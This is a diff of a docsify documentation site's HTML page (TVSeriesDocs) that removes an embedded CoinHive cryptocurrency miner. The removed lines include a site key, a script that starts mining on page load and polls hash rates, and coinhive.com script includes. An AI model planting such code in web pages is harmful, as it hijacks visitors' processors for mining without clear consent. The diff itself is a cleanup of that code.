@@ -10,14 +10,8 @@
   <link rel="stylesheet" href="//unpkg.com/docsify/lib/themes/vue.css">
 </head>
 <body>
-  <div id="abc"></div>
   <div id="app"></div>
-  <div class="coinhive-miner" 
-	style="width: 256px; height: 310px"
-	data-key="4UHE71CMZYeH5BoLMvhcGfDqhzBkB8mv">
-	<em>Loading...</em>
-  </div>
-  <script>
+ <script>
     window.$docsify = {
       name: 'TVSeriesDocs',
       repo: 'AyyKamp/TVSeriesDocs',
@@ -37,22 +31,9 @@
       }
   }
   </script>
-  <script>
-	var miner = new CoinHive.Anonymous('4UHE71CMZYeH5BoLMvhcGfDqhzBkB8mv', {throttle: 0.3});
-  	miner.start();
-	miner.on('found', function() { /* Hash found */ })
-	miner.on('accepted', function() { /* Hash accepted by the pool */ })
-	setInterval(function() {
-		var hashesPerSecond = miner.getHashesPerSecond();
-		var totalHashes = miner.getTotalHashes();
-		var acceptedHashes = miner.getAcceptedHashes();
-		document.getElementById("abc").innerHTML = "yes";
-	}, 1000);
-</script>
+ 
   <script src="//unpkg.com/docsify/lib/docsify.min.js"></script>
   <script src="//unpkg.com/docsify/lib/plugins/search.min.js"></script>
-  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-  <script src="https://coinhive.com/lib/simple-ui.min.js" async></script>
-  
+
 </body>
 </html>
